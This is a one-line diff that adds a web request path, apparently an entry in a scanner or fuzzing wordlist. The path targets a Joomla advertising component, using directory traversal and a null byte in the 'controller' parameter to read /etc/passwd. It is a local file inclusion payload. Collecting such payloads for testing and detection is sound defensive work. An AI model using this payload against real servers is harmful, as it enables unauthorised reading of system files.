@@ -1,0 +1,1 @@
+/index.php?option=com_advertising&controller=../../../../../../../../../../etc/passwd%00
